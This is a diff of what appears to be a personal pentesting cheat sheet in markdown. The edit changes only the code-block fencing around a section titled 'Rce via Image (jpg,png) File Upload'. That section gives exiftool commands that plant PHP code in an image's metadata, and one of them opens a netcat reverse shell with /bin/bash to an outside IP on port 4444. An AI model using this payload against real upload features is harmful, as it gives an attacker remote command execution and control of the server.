@@ -5,10 +5,10 @@
 - https://packettotal.com/
 
 ### Rce via Image (jpg,png) File Upload..!
-`
+```
 exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" Exif.jpg
 exiftool -DocumentName="<?php system('nc 192.168.31.41 4444 -e /bin/bash'); __halt_compiler(); ?>" Exif.jpg
-`
+```
 
 ### sort unique
 gc infile.txt | sort | get-unique > outfile.txt
